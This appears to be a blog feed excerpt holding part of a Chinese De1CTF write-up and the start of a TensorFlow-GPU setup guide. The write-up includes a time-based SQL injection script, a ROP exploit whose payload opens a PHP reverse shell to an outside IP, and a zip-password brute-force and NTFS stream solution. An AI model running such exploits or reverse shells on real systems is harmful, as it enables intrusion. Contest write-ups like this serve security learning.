END)"</span>.format(i,j)</span><br><span class="line">  r=session.get(url,headers = headers,cookies = cookies)</span><br><span class="line">  <span class="comment"># print(url)</span></span><br><span class="line">  sec=r.elapsed.seconds</span><br><span class="line">  <span class="keyword">if</span> sec &gt; <span class="number">3</span>:</span><br><span class="line">   string += chr(j)</span><br><span class="line">   print(chr(j))</span><br><span class="line">   <span class="keyword">break</span></span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure><p>åé¢å‘ç°æœ‰ä¸ª<code>Mininclude</code>ï¼Œåé¢å°±æ˜¯pwnçš„äº†ï¼Œä»å¤§å¸ˆå‚…é‚£é‡Œæ‹¿åˆ°çš„æºç ï¼Œä»”ç»†è¯»è¯»ï¼ŒçœŸçš„ä¸ä¼šâ€¦</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">headers= &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp"</span></span><br><span class="line">&#125;</span><br><span class="line">php_base = <span class="number">0x7f546c3f7000</span></span><br><span class="line">libc_base = <span class="number">0x7f546eacb000</span></span><br><span class="line">minclude_base = <span class="number">0x7f546d84a000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#filename = "index.php" #Here input filename you want to read</span></span><br><span class="line">INITIAL = <span class="number">1526</span> - <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> INITIAL, php_base, minclude_base, libc_base</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'usage: &#123;&#125; path'</span>.format(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    exp = <span class="literal">False</span></span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    filename = sys.argv[<span class="number">1</span>] <span class="comment">#Here input filename you want to read</span></span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">'exp'</span> <span class="keyword">or</span> filename == <span class="string">'debug'</span>:</span><br><span class="line">        <span class="keyword">if</span> filename == <span class="string">'debug'</span>:</span><br><span class="line">            debug = <span class="literal">True</span></span><br><span class="line">            php_base = <span class="number">0x7f40b6ec3000</span></span><br><span class="line">            minclude_base = <span class="number">0x7f40b6eba000</span></span><br><span class="line">            libc_base = <span class="number">0x7f40b7fa0000</span></span><br><span class="line">        orig_ret = <span class="number">0x7f546d151ac0</span></span><br><span class="line">        pop_rdi = php_base + <span class="number">0x000000000014b260</span> <span class="comment"># pop rdi ; ret </span></span><br><span class="line">        php_info = <span class="number">0x47bd10</span> - <span class="number">0x100000</span> + php_base</span><br><span class="line">        ret = php_base + <span class="number">0x14b261</span></span><br><span class="line">        jmp_rdi = php_base + <span class="number">0x000000000019f729</span> <span class="comment"># jmp rdi</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            mov_to_rdi = <span class="number">0x00000000000494ea</span> + libc_base <span class="comment"># mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mov_to_rdi = <span class="number">0x00000000000494e5</span> + libc_base <span class="comment"># mov eax, 1 ; mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line">        pop_pop = <span class="number">0x000000000000135e</span> + minclude_base <span class="comment"># pop rbp ; pop r12 ; ret</span></span><br><span class="line">        pop_rsi = <span class="number">0x000000000002440e</span> + libc_base <span class="comment"># pop rsi ; ret</span></span><br><span class="line">        exp = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        system = libc_base + <span class="number">0x449c0</span></span><br><span class="line">        halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr, val)</span>:</span></span><br><span class="line">            <span class="keyword">assert</span> len(val) == <span class="number">8</span></span><br><span class="line">            <span class="keyword">return</span> p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi)</span><br><span class="line">        area = minclude_base + <span class="number">0x4000</span></span><br><span class="line">        cmd = <span class="string">b"php -r '$sock=fsockopen(\"118.178.180.118\",52333);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'"</span></span><br><span class="line">        cur = <span class="number">0</span></span><br><span class="line">        rop = <span class="string">b''</span></span><br><span class="line">        buf = cmd[:<span class="number">8</span>]</span><br><span class="line">        rop += write(area, buf)</span><br><span class="line">        cur += <span class="number">8</span></span><br><span class="line">        buf = cmd[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">        rop += write(area + <span class="number">8</span>, buf)</span><br><span class="line">        cur += <span class="number">8</span></span><br><span class="line">        rop += p64(pop_pop)</span><br><span class="line">        rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">        rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> cur &lt; len(cmd):</span><br><span class="line">            buf = cmd[cur: cur+<span class="number">8</span>]</span><br><span class="line">            <span class="keyword">if</span> len(buf) != <span class="number">8</span>:</span><br><span class="line">                buf = buf.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>)</span><br><span class="line">            rop += write(area + cur, buf)</span><br><span class="line">            cur += <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        rop += p64(pop_rdi)</span><br><span class="line">        rop += p64(area)</span><br><span class="line">        rop += p64(system)</span><br><span class="line">        rop += halt</span><br><span class="line">        filename = <span class="string">b'a'</span> * (<span class="number">0x88</span>) + rop</span><br><span class="line">    INITIAL += len(filename)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        save_filename = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        save_filename = os.path.basename(filename)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"search"</span>:filename,</span><br><span class="line">        <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#url = "http://134.175.185.244/select.php"</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        url = <span class="string">"http://localhost:51111/select.php"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#url = "http://49.51.251.99/select.php"</span></span><br><span class="line">        url = <span class="string">"http://134.175.185.244/select.php"</span></span><br><span class="line">    r = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp:</span><br><span class="line">        f = open(save_filename, <span class="string">"wb"</span>)</span><br><span class="line">        f.write(r.content[INITIAL:])</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å°±å…ˆæ”¾ä¸€ä¸‹æŠŠï¼Œéœ€è¦æ…¢æ…¢æ¶ˆåŒ–ã€‚</p><h3 id="Misc-Chowder"><a href="#Misc-Chowder" class="headerlink" title="Misc Chowder"></a>Misc Chowder</h3><p>è€ƒå¯Ÿæµé‡å®¡è®¡ã€å‹ç¼©åŒ…å¯†ç çˆ†ç ´ã€NTFSæµéšè—æ–‡ä»¶</p><h4 id="çŸ¥è¯†æ‰©å±•"><a href="#çŸ¥è¯†æ‰©å±•" class="headerlink" title="çŸ¥è¯†æ‰©å±•"></a>çŸ¥è¯†æ‰©å±•</h4><p>å‚è€ƒ<a href="https://blog.csdn.net/alone_map/article/details/51851071">å…³äºNTFSæ•°æ®æµåŠæ–‡ä»¶éšè—</a>ï¼š</p><blockquote><p>NTFSäº¤æ¢æ•°æ®æµï¼ˆalternate data streamsï¼Œç®€ç§°ADSï¼‰æ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œå°±æ˜¯è¯´é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ã€‚å®ƒä½¿ç”¨èµ„æºæ´¾ç”Ÿæ¥ç»´æŒä¸æ–‡ä»¶ç›¸å…³çš„ä¿¡æ¯ï¼Œè™½ç„¶æˆ‘ä»¬æ— æ³•çœ‹åˆ°æ•°æ®æµæ–‡ä»¶ï¼Œä½†æ˜¯å®ƒå´æ˜¯çœŸå®å­˜åœ¨äºæˆ‘ä»¬çš„ç³»ç»Ÿä¸­çš„ã€‚åˆ›å»ºä¸€ä¸ªæ•°æ®äº¤æ¢æµæ–‡ä»¶çš„æ–¹æ³•å¾ˆç®€å•ï¼Œå‘½ä»¤ä¸ºâ€œå®¿ä¸»æ–‡ä»¶ï¼šå‡†å¤‡ä¸å®¿ä¸»æ–‡ä»¶å…³è”çš„æ•°æ®æµæ–‡ä»¶â€ã€‚</p></blockquote><p>åˆ©ç”¨è¿™ç§æ•°æ®æµå…³è”çš„æ–¹å¼ï¼Œå³å¯å°†ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®æµå…³è”åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸Šï¼Œè¿™ç§æ–¹å¼ä¸‹ï¼Œç›®å½•ä¸‹ç›´æ¥<code>dir</code>æ˜¯çœ‹ä¸åˆ°è¢«å…³è”çš„æ•°æ®æµçš„ï¼ˆå½“ç„¶è¢«å…³è”çš„åŸå§‹æ–‡ä»¶è‚¯å®šä¸åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼‰ï¼Œå³å®ç°äº†éšè—ï¼Œä¸è¿‡<code>dir /r</code>å¯ä»¥å°†å…¶åˆ—ä¸¾å‡ºæ¥ã€‚</p><h4 id="è§£é¢˜-3"><a href="#è§£é¢˜-3" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>æ‹¿åˆ°é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œæµé‡å®¡è®¡å‘ç°è¿›è¡Œäº†å¤šæ¬¡uploadï¼Œåˆ©ç”¨wireshark<code>å¯¼å‡ºHTTPå¯¹è±¡</code>å¯ä»¥å°†ä¸Šä¼ çš„æ–‡ä»¶å¯¼å‡ºï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf5.png" alt=""></p><p>åœ¨å¯¼å‡ºHTTPå¯¹è±¡æ—¶ï¼Œå¯ä»¥çœ‹åˆ°æœ‰7æ¬¡uploadçš„åŠ¨ä½œï¼Œæ¯ä¸€ç»„åŒ…å«ä¸¤ä¸ªå¯å¯¼å‡ºçš„å¯¹è±¡<code>upload_file.php</code>ï¼Œæ³¨æ„è§‚å¯Ÿï¼Œä¸¤ä¸ªå¯¹è±¡é‡Œä¸€ä¸ªæ˜¯<code>multipart/form-data</code>ä¸€ä¸ªæ˜¯<code>text/html</code>çš„ï¼Œæ˜¾ç„¶å‰è€…æ˜¯åŒ…å«ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®çš„ï¼Œå°†å…¶å¯¼å‡ºï¼Œå¯¼å‡ºä¹‹åç›´æ¥æ‰“å¼€å‘ç°æ˜¯ä¸Šä¼ æ–‡ä»¶æ—¶å€™çš„åŒ…æ•°æ®ï¼Œè€Œä¸æ˜¯phpä»£ç ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf6.png" alt=""></p><p>è€Œä¸”æ˜¾ç„¶ï¼Œå›¾ç‰‡çš„æ•°æ®å°±åœ¨å…¶ä¸­ï¼Œé‚£å°±ç®€å•äº†ï¼Œ010editorå°†æ•°æ®å¤„ç†ä¸‹ï¼Œåªä¿ç•™å›¾ç‰‡æ•°æ®ï¼Œå†æ”¹åç¼€å°±è¡Œäº†å˜›</p><p><img src="http://ggb0n.cool/images/de1ctf7.png" alt=""></p><p>ä¸€ä¸ªèµ„æºçš„urlï¼Œè®¿é—®å¯ä»¥ä¸‹è½½åˆ°ä¸€ä¸ª<code>docx</code>çš„å‹ç¼©åŒ…ï¼Œè§£å‹æ‰“å¼€æ˜¯è¿™ä¸ªæ ·å­â€¦</p><p><img src="http://ggb0n.cool/images/de1ctf8.png" alt=""></p><p>è€ƒè™‘åˆ°ä¹‹å‰æœ‰çš„docxæ–‡ä»¶ä¼šéšè—å‹ç¼©åŒ…ï¼Œæ‹–åˆ°è§£å‹å·¥å…·é‡Œçœ‹çœ‹ï¼Œè¿˜çœŸæœ‰</p><p><img src="http://ggb0n.cool/images/de1ctf9.png" alt=""></p><p>ä½†æ˜¯éœ€è¦å¯†ç ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œé¢˜ç›®ä¹Ÿç»™å‡ºHintï¼š<code>å‹ç¼©åŒ…å¯†ç æš´ç ´è€ƒç‚¹ä¸­ï¼Œå¯†ç çš„é•¿åº¦ä¸º6ä½ï¼Œå‰ä¸¤ä½ä¸ºDE</code><br>é‚£å°±æ©ç çˆ†ç ´å‘—ï¼Œä¸Š<code>ARCHPR</code>ï¼Œè®¾ç½®æˆæ©ç æ¨¡å¼ï¼Œå¼€å§‹è·‘~</p><p><img src="http://ggb0n.cool/images/de1ctf10.png" alt=""></p><p>æ‹¿åˆ°å¯†ç <del>~</del></p><p>è§£å‹ä¹‹åå‘ç°è¿˜æ˜¯ä¸€å¼ å›¾ï¼Œå¥—å¨ƒäº†ã€‚ã€‚ã€‚</p><p>ä¸è¿‡è¿™ä¸ªå›¾æ‹–åˆ°è§£å‹å·¥å…·é‡Œåˆå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf11.png" alt=""></p><p><code>flag.txt</code>é‡Œçš„æ–‡ä»¶æ˜¯å‡çš„ï¼Œä½†æ˜¯åªè¦ä¸‰ä¸ªæ–‡ä»¶ï¼Œå›¾ç‰‡ä¸­åˆæç¤º<code>I AM FLAG</code>ï¼Œè¯•äº†å…¶ä»–åŠæ³•ä¹Ÿä¸è¡Œâ€¦<br>åæ¥äº†è§£åˆ°ï¼Œå¯èƒ½æ˜¯åˆ©ç”¨äº†<code>NTFS</code>æ•°æ®æµæ¥éšè—flagäº†ï¼ŒWindowsä¸‹åˆ—ä¸¾è§£å‹å‡ºçš„ç›®å½•è¯•è¯•ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf12.png" alt=""></p><p>æœç„¶å­˜åœ¨éšè—çš„NTFSæµï¼Œå°†<code>fffffffflllll.txt</code>çš„å†…å®¹å…³è”åˆ°äº†<code>666.jpg</code>é‡Œï¼Œè¿™æ ·ï¼Œå…¶å®ç”¨notepadè¯»å–<code>666.jpg:fffffffflllll.txt</code>å°±å¯ä»¥äº†</p><p><img src="http://ggb0n.cool/images/de1ctf13.png" alt=""></p><p><em>æˆé•¿è·¯ä¸Šï¼Œè¦å­¦çš„è¿˜å¾ˆå¤š</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™ä¸ªæ¯”èµ›å¤ªè€ƒå·¥ä½œé‡ï¼Œä¸ªäººæ„Ÿè§‰çŸ¥è¯†é‡ä¹Ÿæ¯”è¾ƒå¤§ï¼Œå¦å¤–De1taçš„å¸ˆå‚…ä»¬åŸæ¥è¿™ä¹ˆçˆ±ç©MCå•ŠğŸ¤”ï¼Œå†™ä¸€ä¸‹å‡ ä¸ªé¢˜çš„é¢˜è§£ï¼Œä¸»è¦è®°å½•ä¸€ä¸‹å­¦åˆ°çš„ä¸œè¥¿ã€‚
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="æ¯”èµ›åˆ’æ°´" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="SQLæ³¨å…¥" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://ggb0n.cool/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="htaccessè§£æ" scheme="http://ggb0n.cool/tags/htaccess%E8%A7%A3%E6%9E%90/"/>
    
      <category term="NTFSæ•°æ®æµéšè—" scheme="http://ggb0n.cool/tags/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E8%97%8F/"/>
    
      <category term="NTFSç‰¹æ€§ä¸Šä¼ ç»•è¿‡" scheme="http://ggb0n.cool/tags/NTFS%E7%89%B9%E6%80%A7%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
    
      <category term="åŸŸæ¸—é€" scheme="http://ggb0n.cool/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="CVE" scheme="http://ggb0n.cool/tags/CVE/"/>
    
      <category term="CVE-2014-6324åŸŸæ§ææƒ" scheme="http://ggb0n.cool/tags/CVE-2014-6324%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>æ·±åº¦å­¦ä¹ ç¯å¢ƒé…ç½®</title>
    <link href="http://ggb0n.cool/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://ggb0n.cool/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2020-05-01T15:23:59.000Z</published>
    <updated>2020-05-01T16:16:44.581Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ä¸€æ®µæ—¶é—´ï¼Œä¸€ç›´åœ¨ç”¨CPUè·‘ç®—æ³•è®­ç»ƒè‡ªå·±çš„æ¨¡å‹ï¼Œä»Šå¤©çªç„¶æ„è¯†åˆ°æ˜¯æ”¯æŒGPUçš„å•Šï¼Œåˆå¿«åˆçœèµ„æºï¼Œä¸ç”¨å®ƒä¸æ˜¯å‚»å—â€¦ğŸ™„    <a id="more"></a></p><p>ä¸‹é¢è®°å½•ä¸€ä¸‹å¦‚ä½•é…ç½®<code>TensorFlow-gpu + CUDA + Keras</code>å®ç°GPUè®­ç»ƒæ·±åº¦å­¦ä¹ ç®—æ³•çš„æ¨¡å‹ã€‚</p><h3 id="ä¸€äº›ç®€ä»‹"><a href="#ä¸€äº›ç®€ä»‹" class="headerlink" title="ä¸€äº›ç®€ä»‹"></a>ä¸€äº›ç®€ä»‹</h3><p>å…³äº<a href="https://www.tensorflow.org/">TensorFlow</a>ï¼š</p><blockquote><p>TensorFlow æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯å¼€æºæœºå™¨å­¦ä¹ å¹³å°ã€‚å®ƒæ‹¥æœ‰ä¸€ä¸ªå…¨é¢è€Œçµæ´»çš„ç”Ÿæ€ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«å„ç§å·¥å…·ã€åº“å’Œç¤¾åŒºèµ„æºï¼Œå¯åŠ©åŠ›ç ”ç©¶äººå‘˜æ¨åŠ¨å…ˆè¿›æœºå™¨å­¦ä¹ æŠ€æœ¯çš„å‘å±•ï¼Œå¹¶ä½¿å¼€å‘è€…èƒ½å¤Ÿè½»æ¾åœ°æ„å»ºå’Œéƒ¨ç½²ç”±æœºå™¨å­¦ä¹ æä¾›æ”¯æŒçš„åº”ç”¨ã€‚</p></blockquote><p>å…³äº<a href="https://keras.io/">Keras</a>ï¼š</p><blockquote><p>Kerasæ˜¯ç”¨Pythonç¼–å†™çš„é«˜çº§ç¥ç»ç½‘ç»œAPIï¼Œèƒ½å¤Ÿåœ¨TensorFlowï¼Œ<a href="https://github.com/Microsoft/cntk">CNTK</a>æˆ–<a href="https://github.com/Theano/Theano">Theano</a>ä¹‹ä¸Šè¿è¡Œã€‚å®ƒçš„å¼€å‘ç€çœ¼äºå®ç°å¿«é€Ÿå®éªŒã€‚èƒ½å¤Ÿä»¥æœ€å°çš„å»¶è¿Ÿå°†æƒ³æ³•ä»˜è¯¸å®è·µæ˜¯è¿›è¡Œè‰¯å¥½ç ”ç©¶çš„å…³é”®ã€‚</p><ul><li>å…è®¸è½»æ¾å¿«é€Ÿåœ°è¿›è¡ŒåŸå‹åˆ¶ä½œï¼ˆé€šè¿‡ç”¨æˆ·å‹å¥½æ€§ï¼Œæ¨¡å—åŒ–å’Œå¯æ‰©å±•æ€§ï¼‰ã€‚</li><li>æ”¯æŒå·ç§¯ç½‘ç»œå’Œå¾ªç¯ç½‘ç»œï¼Œä»¥åŠä¸¤è€…çš„ç»„åˆã€‚</li><li>åœ¨CPUå’ŒGPUä¸Šæ— ç¼è¿è¡Œã€‚</li></ul></blockquote><p>å…³äº<a href="https://developer.nvidia.com/">CUDA</a>ï¼š</p><blockquote><p>CUDA(ComputeUnified Device Architecture)ï¼Œæ˜¯æ˜¾å¡å‚å•†NVIDIAæ¨å‡ºçš„è¿ç®—å¹³å°ã€‚ CUDAæ˜¯ä¸€ç§ç”±NVIDIAæ¨å‡ºçš„é€šç”¨å¹¶è¡Œè®¡ç®—æ¶æ„ï¼Œè¯¥æ¶æ„ä½¿GPUèƒ½å¤Ÿè§£å†³å¤æ‚çš„è®¡ç®—é—®é¢˜ã€‚</p></blockquote><p>å…³äº<a href="https://docs.nvidia.com/deeplearning/sdk/cudnn-install/">cuDNN</a>ï¼š</p><blockquote><p>NVIDIA cuDNNæ˜¯ç”¨äºæ·±åº¦ç¥ç»ç½‘ç»œçš„GPUåŠ é€Ÿåº“ã€‚å®ƒå¼ºè°ƒæ€§èƒ½ã€æ˜“ç”¨æ€§å’Œä½å†…å­˜å¼€é”€ã€‚NVIDIA cuDNNå¯ä»¥é›†æˆåˆ°æ›´é«˜çº§åˆ«çš„æœºå™¨å­¦ä¹ æ¡†æ¶ä¸­ï¼Œå¦‚è°·æ­Œçš„Tensorflowã€åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡çš„æµè¡Œcaffeè½¯ä»¶ã€‚ç®€å•çš„æ’å…¥å¼è®¾è®¡å¯ä»¥è®©å¼€å‘äººå‘˜ä¸“æ³¨äºè®¾è®¡å’Œå®ç°ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œè€Œä¸æ˜¯ç®€å•è°ƒæ•´æ€§èƒ½ï¼ŒåŒæ—¶è¿˜å¯ä»¥åœ¨GPUä¸Šå®ç°é«˜æ€§èƒ½ç°ä»£å¹¶è¡Œè®¡ç®—ã€‚</p></blockquote><p>å…³äºCUDA + cuDNNçš„ç»„åˆï¼š</p><blockquote><p>CUDAçœ‹ä½œæ˜¯ä¸€ä¸ªå·¥ä½œå°ï¼Œä¸Šé¢é…æœ‰å¾ˆå¤šå·¥å…·ï¼Œå¦‚é”¤å­ã€èºä¸åˆ€ç­‰ã€‚cuDNNæ˜¯åŸºäºCUDAçš„æ·±åº¦å­¦ä¹ GPUåŠ é€Ÿåº“ï¼Œæœ‰äº†å®ƒæ‰èƒ½åœ¨GPUä¸Šå®Œæˆæ·±åº¦å­¦ä¹ çš„è®¡ç®—ã€‚å®ƒå°±ç›¸å½“äºå·¥ä½œçš„å·¥å…·ï¼Œæ¯”å¦‚å®ƒå°±æ˜¯ä¸ªæ‰³æ‰‹ã€‚ä½†æ˜¯CUDAè¿™ä¸ªå·¥ä½œå°ä¹°æ¥çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰é€æ‰³æ‰‹ã€‚æƒ³è¦åœ¨CUDAä¸Šè¿è¡Œæ·±åº¦ç¥ç»ç½‘ç»œï¼Œå°±è¦å®‰è£…cuDNNï¼Œå°±åƒä½ æƒ³è¦æ‹§ä¸ªèºå¸½å°±è¦æŠŠæ‰³æ‰‹ä¹°å›æ¥ã€‚è¿™æ ·æ‰èƒ½ä½¿GPUè¿›è¡Œæ·±åº¦ç¥ç»ç½‘ç»œçš„å·¥ä½œï¼Œå·¥ä½œé€Ÿåº¦ç›¸è¾ƒCPUå¿«å¾ˆå¤šã€‚</p></blockquote><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>é€šè¿‡ä»Šå¤©è¸©çš„å‘ï¼Œæé†’è¿‘æœŸå¦‚æœéœ€è¦ç”¨tensorflow+cudaå®ç°GPUè¿ç®—çš„è¯ï¼Œæœ€å¥½å®‰è£…<code>tensorflow-gpu-2.0.0</code>å’Œ<code>duca-10.0</code>ï¼Œæˆ–è€…æ›´ä½çš„ç‰ˆæœ¬ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå®˜ç½‘å„ç‰ˆæœ¬å¯¹åº”çš„ä¿¡æ¯ã€‚</p><h4 id="å®‰è£…tensorflow"><a href="#å®‰è£…tensorflow" class="headerlink" title="å®‰è£…tensorflow"></a>å®‰è£…tensorflow</h4><p>pythonä¸‹ç›´æ¥è½¬<code>tensorflow-gpu</code>çš„åº“å³å¯ï¼Œå“¦ï¼<code>python3</code>çš„ç‰ˆæœ¬ä¸€å®šè¦åœ¨<code>3.7</code>ä¹‹ä¸‹å“¦ï¼Œè¿˜æœ‰ä¸€å®šè¦<code>64bit</code>çš„â€¦</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install tensorflow-gpu==<span class="number">2.0</span><span class="number">.0</span></span><br><span class="line"><span class="comment"># æˆ–è€…ç”¨å›½å†…é•œåƒæºåŠ é€Ÿå®‰è£…</span></span><br><span class="line">python3 -m pip install tensorflow-gpu==<span class="number">2.0</span><span class="number">.0</span> -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…Keras"><a href="#å®‰è£…Keras" class="headerlink" title="å®‰è£…Keras"></a>å®‰è£…Keras</h4><p>pythonç›´æ¥è£…åº“</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install keras</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…é…ç½®DUCA"><a href="#å®‰è£…é…ç½®DUCA" class="headerlink" title="å®‰è£…é…ç½®DUCA"></a>å®‰è£…é…ç½®DUCA</h4><p>è¿™é‡Œè£…çš„tensorflowæ˜¯<code>2.0.0</code>ç‰ˆæœ¬ï¼Œå› æ­¤ducaéœ€è¦<code>10.0</code>ç‰ˆæœ¬ï¼Œå¯ä»¥å»å®˜ç½‘ä¸‹è½½<a href="https://developer.nvidia.com/cuda-10.0-download-archive">v10.0</a>ï¼Œé€‰æ‹©<code>exe(local)</code>ï¼Œå¯ä»¥ç›´æ¥å®Œæ•´åŒ–å®‰è£…ã€‚</p><p>ä¸‹è½½ä¹‹åè¿è¡Œå®‰è£…ç¨‹åºï¼Œå¦‚æœä¸æƒ³éº»çƒ¦ç›´æ¥é»˜è®¤<code>ç®€æ˜“</code>å®‰è£…å³å¯ï¼Œå®‰è£…å®Œæ¯•ä¹‹åå¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œå¯èƒ½åé¦ˆå¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import tensorflow</span><br><span class="line"><span class="number">2020</span>-<span class="number">04</span>-<span class="number">07</span> <span class="number">16</span>:<span class="number">00</span>:<span class="number">12</span>.<span class="number">823507</span>: W tensorflow/stream_executor/platform/default/dso_loader.cc:<span class="number">55</span>] Could <span class="keyword">not</span> load dynamic library 'cudart64_100.dll'; dlerror: cudart64_101.dll <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ç¼ºå°‘äº†<code>cudart64_100.dll</code>è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå¯ä»¥å»<a href="https://cn.dll-files.com/download/f0ab3cac7e90959a38e97b262ebdf3f2/cudart64_100.dll.html?c=MGJjSTdyU1pLWWlGT0FNbmRlWEozUT09">è¿™é‡Œ</a>ä¸‹è½½ï¼Œä¸‹è½½å®Œä¹‹åï¼Œå°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶æ”¾å…¥<code>C:\Windows\System32</code>ç›®å½•ä¸‹ï¼Œä¸è¿‡é…ç½®å¹¶æœªå®Œæˆï¼Œå› ä¸º<code>cuDNN</code>è¿˜æœªå®‰è£…é…ç½®ã€‚</p><h4 id="é…ç½®cuDNN"><a href="#é…ç½®cuDNN" class="headerlink" title="é…ç½®cuDNN"></a>é…ç½®cuDNN</h4><p><a 